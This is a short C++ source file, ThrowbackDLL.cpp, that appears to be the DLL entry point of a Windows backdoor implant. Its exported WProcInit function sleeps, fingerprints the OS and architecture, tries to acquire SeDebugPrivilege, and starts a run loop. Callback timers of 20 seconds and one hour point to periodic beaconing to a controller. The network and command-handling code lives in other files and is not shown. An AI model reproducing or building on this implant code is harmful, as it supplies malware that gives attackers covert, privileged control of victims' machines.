// ThrowbackDLL.cpp : Defines the exported functions for the DLL application.
//
#include "stdafx.h"
#include <Windows.h>
#include <string>
#include <time.h>
#include <winhttp.h>
#include <UrlMon.h>
#include <ShellAPI.h>
#include "..\Throwback\Throwback.h"

using namespace std;

//DEFAULT CALLBACK PERIODS
int SHORTTIMEOUT = 20; //IN SECONDS

#ifdef _DEBUG
int DEFAULTTIMEOUT = 5; //IN SECONDS
#else
int DEFAULTTIMEOUT = 3600; //IN SECONDS = 60 MINUTES
#endif

//ADMIN PRIVS
int adminPrivs; //1 = YES, 0 = NO

//OS TYPE
bool osType; // 0=2K, XP, 2K3 and 1=Vista, 7, 2K8
bool osArch; // 0=x86, 1=x64

int UninstallTB()
{
	return 0;
}

extern "C" __declspec( dllexport ) int WProcInit()
{
	sleepDelay(10);

	OutputDebugString(L"IN InitDll()");

	//CHECK OS TYPE
	osType = checkOS();
	
	//OutputDebugString(L"CHECKING ARCH");

	//CHECK ARCHITECTURE
	osArch = checkArch();

	OutputDebugString(L"CHECKING PRIVS");

	//CHECK PRIVILEGE LEVEL
	adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);
	//if(adminPrivs == 0) OutputDebugString(L"RUNNING AS USER!?!");
	//else OutputDebugString(L"RUNNING AS SYSTEM!!");

	//OutputDebugString(L"INITIALIZING VARS");

	//INITIALIZE GLOBAL VARIABLES
	int ret = initializeVars();

	sleepDelay(5);

	runLoop();
	
	//OutputDebugString(L"DONE!");
	return 0;

}